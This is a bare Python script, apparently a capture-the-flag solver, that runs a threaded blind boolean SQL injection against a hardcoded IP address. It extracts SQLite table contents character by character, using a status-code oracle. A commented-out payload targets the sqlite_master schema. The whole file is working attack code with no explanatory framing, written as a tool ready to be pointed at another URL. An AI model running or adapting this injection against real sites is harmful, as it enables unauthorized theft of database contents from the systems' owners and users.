import requests, string, sys, warnings, time, concurrent.futures

from requests.packages.urllib3.exceptions import InsecureRequestWarning

warnings.simplefilter('ignore',InsecureRequestWarning)

  

req = requests.Session()

url = "http://34.124.192.13:54679/view/1"

extracted = ""

chars = string.printable

index = list(range(1,264))

  

def brute(str_index):

    for char in chars:

        # payload = f"' and (SELECT hex(substr(sql,{str_index},1)) FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='products' limit 1 offset 0) = hex('{char}')--+-"
        payload = f"' and (SELECT hex(substr(data,{str_index},1)) FROM products limit 1 offset 1) = hex('{char}')--+-"

        resp = requests.get(url + payload)

        if resp.status_code == 200:

            found = char

            print(f"\r[+] Found: {found} at index {str_index}")

            break

    return found

#reference

with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:

    processes = executor.map(brute, index)

for c in processes:

    sys.stdout.write(f"\r[+] Extracting data: {extracted}{c}")

    extracted += c